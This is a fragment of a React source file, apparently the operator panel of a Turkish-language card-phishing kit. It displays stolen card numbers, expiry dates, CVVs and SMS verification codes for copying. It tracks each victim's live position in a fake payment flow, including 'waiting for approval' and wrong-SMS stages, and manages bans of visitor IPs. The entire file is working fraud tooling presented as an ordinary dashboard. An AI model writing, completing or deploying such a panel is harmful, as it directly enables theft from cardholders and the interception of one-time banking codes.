                    <path fillRule="evenodd" clipRule="evenodd" d="M3.04199 9.37381C3.04199 5.87712 5.87735 3.04218 9.37533 3.04218C12.8733 3.04218 15.7087 5.87712 15.7087 9.37381C15.7087 12.8705 12.8733 15.7055 9.37533 15.7055C5.87735 15.7055 3.04199 12.8705 3.04199 9.37381ZM9.37533 1.54218C5.04926 1.54218 1.54199 5.04835 1.54199 9.37381C1.54199 13.6993 5.04926 17.2055 9.37533 17.2055C11.2676 17.2055 13.0032 16.5346 14.3572 15.4178L17.1773 18.2381C17.4702 18.531 17.945 18.5311 18.2379 18.2382C18.5308 17.9453 18.5309 17.4704 18.238 17.1775L15.4182 14.3575C16.5367 13.0035 17.2087 11.2671 17.2087 9.37381C17.2087 5.04835 13.7014 1.54218 9.37533 1.54218Z" />
                  </svg>
                </span>
                <input
                  type="text"
                  placeholder="Ara..."
                  value={searchTerm}
                  onChange={(e) => {
                    setSearchTerm(e.target.value);
                    setCurrentPage(1);
                  }}
                  className="dark:bg-dark-900 shadow-theme-xs focus:border-brand-300 focus:ring-brand-500/10 dark:focus:border-brand-800 h-[42px] w-full rounded-lg border border-gray-300 bg-transparent py-2.5 pr-4 pl-[42px] text-sm text-gray-800 placeholder:text-gray-400 focus:ring-3 focus:outline-hidden xl:w-[300px] dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 dark:placeholder:text-white/30"
                />
              </div>
            </form>
          </div>
        </div>

        {/* Ban Management Modal */}
        {showBanModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm p-4">
            <div className="w-full max-w-md bg-white dark:bg-gray-800 rounded-2xl shadow-2xl overflow-hidden border border-gray-100 dark:border-gray-700">
              <div className="p-4 border-b border-gray-100 dark:border-gray-700 flex items-center justify-between bg-gray-50/50 dark:bg-gray-800/50">
                <h3 className="text-lg font-bold text-gray-800 dark:text-white flex items-center gap-2">
                  <span className="p-1.5 bg-red-100 text-red-600 rounded-lg dark:bg-red-500/10">
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" />
                    </svg>
                  </span>
                  Ban Yönetimi
                </h3>
                <button
                  onClick={() => setShowBanModal(false)}
                  className="p-1 hover:bg-gray-100 dark:hover:bg-gray-700 rounded-lg transition-colors"
                >
                  <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
              </div>

              <div className="p-4 max-h-[60vh] overflow-y-auto">
                {bannedIps.length === 0 ? (
                  <div className="text-center py-8 text-gray-500 dark:text-gray-400">
                    <div className="bg-gray-100 dark:bg-gray-700/50 h-16 w-16 rounded-full flex items-center justify-center mx-auto mb-3">
                      <svg className="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                      </svg>
                    </div>
                    Banlı IP adresi bulunmuyor
                  </div>
                ) : (
                  <div className="space-y-3">
                    <button
                      onClick={handleUnbanAll}
                      className="w-full py-2 bg-red-50 text-red-600 rounded-lg border border-red-100 hover:bg-red-100 transition-colors text-sm font-semibold flex items-center justify-center gap-2"
                    >
                      <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                      </svg>
                      Tüm Banları Kaldır
                    </button>
                    <div className="space-y-2">
                      {bannedIps.map((log: any, idx) => (
                        <div key={idx} className="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-700/30 rounded-lg border border-gray-100 dark:border-gray-700">
                          <span className="font-mono text-sm text-gray-600 dark:text-gray-300">{log.ip}</span>
                          <button
                            onClick={() => handleUnban(log.ip)}
                            className="text-xs px-3 py-1.5 bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-600 rounded-md hover:bg-gray-50 dark:hover:bg-gray-700 transition-colors font-medium text-gray-600 dark:text-gray-300"
                          >
                            Ban Kaldır
                          </button>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {/* Table */}
        <div className="custom-scrollbar max-w-full overflow-x-auto overflow-y-visible px-3 flex-1">
          {loading ? (
            <div className="py-12 text-center">
              <div className="animate-spin h-8 w-8 border-4 border-brand-500 border-t-transparent rounded-full mx-auto"></div>
              <p className="mt-4 text-gray-500 dark:text-gray-400">Yükleniyor...</p>
            </div>
          ) : (
            <table className="w-full">
              <thead className="border-y border-gray-100 dark:border-gray-800">
                <tr>
                  <th className="py-2.5 px-2 font-medium text-left w-10">
                    <svg className="w-5 h-5 text-gray-500 dark:text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
                    </svg>
                  </th>
                  <th className="px-2 py-2.5 font-medium text-left w-[207px]" style={{ width: '207px' }}>
                    <p className="text-xs text-gray-500 dark:text-gray-400">Kart Numarası</p>
                  </th>
                  <th className="px-2 py-2.5 font-medium text-left">
                    <p className="text-xs text-gray-500 dark:text-gray-400">SKT</p>
                  </th>
                  <th className="px-2 py-2.5 font-medium text-left">
                    <p className="text-xs text-gray-500 dark:text-gray-400">CVV</p>
                  </th>
                  <th className="px-2 py-2.5 font-medium text-left">
                    <p className="text-xs text-gray-500 dark:text-gray-400">SMS</p>
                  </th>
                  <th className="px-2 py-2.5 font-medium text-left">
                    <p className="text-xs text-gray-500 dark:text-gray-400">Tutar</p>
                  </th>
                  <th className="px-2 py-2.5 font-medium text-left">
                    <p className="text-xs text-gray-500 dark:text-gray-400">Seviye</p>
                  </th>
                  <th className="px-2 py-2.5 font-medium text-left">
                    <p className="text-xs text-gray-500 dark:text-gray-400">Banka</p>
                  </th>
                  <th className="px-2 py-2.5 font-medium text-left">
                    <p className="text-xs text-gray-500 dark:text-gray-400">Tarih</p>
                  </th>
                  <th className="px-2 py-2.5 font-medium text-left">
                    <p className="text-xs text-gray-500 dark:text-gray-400">IP</p>
                  </th>
                  <th className="px-2 py-2.5 font-medium text-left">
                    <p className="text-xs text-gray-500 dark:text-gray-400">Durum</p>
                  </th>
                  <th className="px-2 py-2.5 font-medium text-center">
                    <p className="text-xs text-gray-500 dark:text-gray-400">İşlem</p>
                  </th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100 dark:divide-gray-800">
                {paginatedLogs.length > 0 ? (
                  paginatedLogs.map((log, index) => (
                    <tr
                      key={log.id}
                      className={`table-row-hover ${log.is_hard ? 'bg-red-950/40 dark:bg-red-950/50 border-l-2 border-l-red-700' : ''}`}
                    >
                      <td className="py-2 px-1 whitespace-nowrap">
                        <button
                          onClick={() => showAddressModal(log)}
                          className="p-1.5 text-gray-500 hover:text-brand-500 hover:bg-brand-50 rounded-lg transition-colors dark:text-gray-400 dark:hover:text-brand-400 dark:hover:bg-brand-500/10"
                          title="Adres Detayı"
                        >
                          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
                          </svg>
                        </button>
                      </td>
                      <td className="px-2 py-2 whitespace-nowrap w-[207px]" style={{ width: '207px' }}>
                        <div className="flex items-center gap-2">
                          {onlineIps.includes(log.ip) ? (
                            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-green-500 text-white shadow-lg shadow-green-500/30 min-w-[32px]">
                              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5.636 18.364a9 9 0 010-12.728m12.728 0a9 9 0 010 12.728m-9.9-2.829a5 5 0 010-7.07m7.072 0a5 5 0 010 7.07M12 12a1 1 0 100-2 1 1 0 000 2z" />
                              </svg>
                            </div>
                          ) : (
                            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-red-500 text-white shadow-lg shadow-red-500/30 min-w-[32px]">
                              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.243 2.829a4.978 4.978 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414" />
                              </svg>
                            </div>
                          )}
                          <span
                            className="font-mono text-xs tracking-wide copy-hover ml-[10px]"
                            style={getColumnStyle('kredi_karti')}
                            onClick={() => copyToClipboard(log.kredi_karti, 'Kart')}
                            title="Tıkla ve kopyala"
                          >
                            {log.kredi_karti}
                          </span>
                        </div>
                      </td>
                      <td className="px-1 py-2 whitespace-nowrap">
                        <span
                          className="copy-hover text-xs"
                          style={getColumnStyle('skt')}
                          onClick={() => copyToClipboard(log.skt, 'SKT')}
                          title="Tıkla ve kopyala"
                        >
                          {log.skt}
                        </span>
                      </td>
                      <td className="px-1 py-2 whitespace-nowrap">
                        <span
                          className="copy-hover text-xs"
                          style={getColumnStyle('cvv')}
                          onClick={() => copyToClipboard(log.cvv, 'CVV')}
                          title="Tıkla ve kopyala"
                        >
                          {log.cvv}
                        </span>
                      </td>
                      <td className="px-1 py-2 whitespace-nowrap">
                        <span
                          className="font-mono text-xs copy-hover cursor-pointer"
                          style={getColumnStyle('sms')}
                          onClick={() => log.sms && copyToClipboard(log.sms, 'SMS')}
                          title={log.sms ? "Tıkla ve kopyala" : ""}
                        >
                          {log.sms || '-'}
                        </span>
                      </td>
                      <td className="px-1 py-2 whitespace-nowrap">
                        <span className="text-xs font-medium" style={getColumnStyle('tutar')}>{log.tutar}</span>
                      </td>
                      <td className="px-1 py-2 whitespace-nowrap">
                        <span
                          className="inline-flex rounded px-1.5 py-0.5 text-xs bg-cyan-100/50 dark:bg-cyan-700/50"
                          style={getColumnStyle('seviye')}
                        >
                          {log.seviye || '-'}
                        </span>
                      </td>
                      <td className="px-1 py-2 whitespace-nowrap">
                        <div className="flex flex-col">
                          <span className="text-xs truncate block max-w-[110px]" style={getColumnStyle('banka')}>{log.banka}</span>
                          <span className="text-[10px] text-gray-400 truncate block max-w-[110px]">{log.marka}</span>
                        </div>
                      </td>
                      <td className="px-1 py-2 whitespace-nowrap">
                        <span className="text-xs" style={getColumnStyle('tarih')}>{getRelativeTime(log.tarih)}</span>
                      </td>
                      <td className="px-1 py-2 whitespace-nowrap">
                        <span className="text-xs font-mono text-gray-500 dark:text-gray-400">{log.ip}</span>
                      </td>
                      <td className="px-1 py-2 whitespace-nowrap">
                        {log.live_kontrol && log.live_kontrol.trim() !== '' ? (
                          (() => {
                            const path = log.live_kontrol.trim();

                            // 1. Special Case: /odeme/onay (Rainbow + BEKLİYOR)
                            if (path.includes('/odeme/onay')) {
                              return (
                                <span className="rounded-full px-3 py-1 font-bold flex items-center gap-2 shadow-sm text-[13px] min-w-[60px] justify-center animate-rainbow !text-white">
                                  <span className="truncate">🥱 BEKLİYOR</span>
                                </span>
                              );
                            }

                            // 2. Determine content based on path
                            let content;
                            if (path === '/') {
                              content = <span className="text-sm">🏠</span>;
                            } else if (path.includes('/odeme/hatali-sms')) {
                              content = '❌ Hatali Sms';
                            } else if (path.includes('/odeme/sms')) {
                              content = '📲 SMS';
                            } else if (path.includes('/odeme/tebrikler')) {
                              content = '🎉 Tebrikler';
                            } else if (path.includes('/odeme')) {
                              content = '💵 Odeme';
                            } else {
                              // Default: Blue Icon + Path
                              content = (
                                <>
                                  <span className="relative flex h-2 w-2 flex-shrink-0">
                                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"></span>
                                    <span className="relative inline-flex rounded-full h-2 w-2 bg-blue-500"></span>
                                  </span>
                                  <span className="truncate">{path}</span>
                                </>
                              );
                            }

                            // 3. Render Standard Blue Badge
                            return (
                              <span
                                className="rounded-full px-3 py-1 font-bold flex items-center gap-2 shadow-sm text-[13px] min-w-[60px] justify-center !text-white"
                                style={{ backgroundColor: '#2196f36e' }}
                              >
                                {content}
                              </span>
                            );
                          })()
                        ) : log.durum === 'BEKLİYOR' ? (
                          <span
                            className="rounded-full px-2 py-0.5 font-medium text-gray-800 dark:text-white"
                            style={{ fontSize: '12px', backgroundColor: 'rgb(145 244 54 / 62%)' }}
                          >
                            Seni Bekliyor !
                          </span>
                        ) : (
                          <span className={`rounded-full px-2 py-0.5 text-[10px] font-medium ${getStatusStyle(log.durum)}`}>
                            {log.durum}
                          </span>
                        )}
                      </td>
                      <td className="px-1 py-2 whitespace-nowrap text-center">
                        <button
                          onClick={() => showActionMenu(log)}
                          className="flex h-9 w-9 items-center justify-center rounded-lg bg-brand-500/20 text-brand-500 hover:bg-brand-500 hover:text-white transition-all duration-200 dark:bg-brand-500/30 dark:text-brand-400 dark:hover:bg-brand-500 dark:hover:text-white mx-auto"
                        >
                          <svg className="fill-current" width="21" height="21" viewBox="0 0 24 24" fill="none">
                            <path fillRule="evenodd" clipRule="evenodd" d="M5.99902 10.245C6.96552 10.245 7.74902 11.0285 7.74902 11.995V12.005C7.74902 12.9715 6.96552 13.755 5.99902 13.755C5.03253 13.755 4.24902 12.9715 4.24902 12.005V11.995C4.24902 11.0285 5.03253 10.245 5.99902 10.245ZM17.999 10.245C18.9655 10.245 19.749 11.0285 19.749 11.995V12.005C19.749 12.9715 18.9655 13.755 17.999 13.755C17.0325 13.755 16.249 12.9715 16.249 12.005V11.995C16.249 11.0285 17.0325 10.245 17.999 10.245ZM13.749 11.995C13.749 11.0285 12.9655 10.245 11.999 10.245C11.0325 10.245 10.249 11.0285 10.249 11.995V12.005C10.249 12.9715 11.0325 13.755 11.999 13.755C12.9655 13.755 13.749 12.9715 13.749 12.005V11.995Z" />
                          </svg>
                        </button>
                      </td>
                    </tr>
                  ))
                ) : (
                  <tr>
                    <td colSpan={12} className="py-12 text-center text-gray-500 dark:text-gray-400">
                      <div className="flex flex-col items-center gap-2">
                        <span className="text-4xl">📋</span>
                        <p>Kayıt bulunamadı</p>
                      </div>
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          )}
        </div>

        {/* Pagination */}
        {totalPages > 1 && (
          <div className="border-t border-gray-200 px-6 py-4 dark:border-gray-800">
            <div className="flex items-center justify-between">
              <button
                onClick={() => setCurrentPage(Math.max(1, currentPage - 1))}
                disabled={currentPage === 1}
                className="text-theme-sm shadow-theme-xs flex items-center gap-2 rounded-lg border border-gray-300 bg-white px-3.5 py-2 font-medium text-gray-700 hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed dark:border-gray-700 dark:bg-gray-800 dark:text-gray-400 dark:hover:bg-gray-700"
              >
                <svg className="fill-current" width="20" height="20" viewBox="0 0 20 20" fill="none">
                  <path fillRule="evenodd" clipRule="evenodd" d="M2.58301 9.99868C2.58272 10.1909 2.65588 10.3833 2.80249 10.53L7.79915 15.5301C8.09194 15.8231 8.56682 15.8233 8.85981 15.5305C9.15281 15.2377 9.15297 14.7629 8.86018 14.4699L5.14009 10.7472L16.6675 10.7472C17.0817 10.7472 17.4175 10.4114 17.4175 9.99715C17.4175 9.58294 17.0817 9.24715 16.6675 9.24715L5.14554 9.24715L8.86017 5.53016C9.15297 5.23717 9.15282 4.7623 8.85983 4.4695C8.56684 4.1767 8.09197 4.17685 7.79917 4.46984L2.84167 9.43049C2.68321 9.568 2.58301 9.77087 2.58301 9.99715C2.58301 9.99766 2.58301 9.99817 2.58301 9.99868Z" />
                </svg>
                Önceki
              </button>

              <span className="text-sm font-medium text-gray-700 dark:text-gray-400">
                Sayfa {currentPage} / {totalPages}
              </span>

              <button
                onClick={() => setCurrentPage(Math.min(totalPages, currentPage + 1))}
                disabled={currentPage === totalPages}
                className="text-theme-sm shadow-theme-xs flex items-center gap-2 rounded-lg border border-gray-300 bg-white px-3.5 py-2 font-medium text-gray-700 hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed dark:border-gray-700 dark:bg-gray-800 dark:text-gray-400 dark:hover:bg-gray-700"
              >
                Sonraki
                <svg className="fill-current" width="20" height="20" viewBox="0 0 20 20" fill="none">
                  <path fillRule="evenodd" clipRule="evenodd" d="M17.4175 9.9986C17.4178 10.1909 17.3446 10.3832 17.198 10.53L12.2013 15.5301C11.9085 15.8231 11.4337 15.8233 11.1407 15.5305C10.8477 15.2377 10.8475 14.7629 11.1403 14.4699L14.8604 10.7472L3.33301 10.7472C2.91879 10.7472 2.58301 10.4114 2.58301 9.99715C2.58301 9.58294 2.91879 9.24715 3.33301 9.24715L14.8549 9.24715L11.1403 5.53016C10.8475 5.23717 10.8477 4.7623 11.1407 4.4695C11.4336 4.1767 11.9085 4.17685 12.2013 4.46984L17.1588 9.43049C17.3173 9.568 17.4175 9.77087 17.4175 9.99715C17.4175 9.99763 17.4175 9.99812 17.4175 9.9986Z" />
                </svg>
              </button>
            </div>
          </div>
        )}
      </div>
    </DashboardLayout>
  );
}
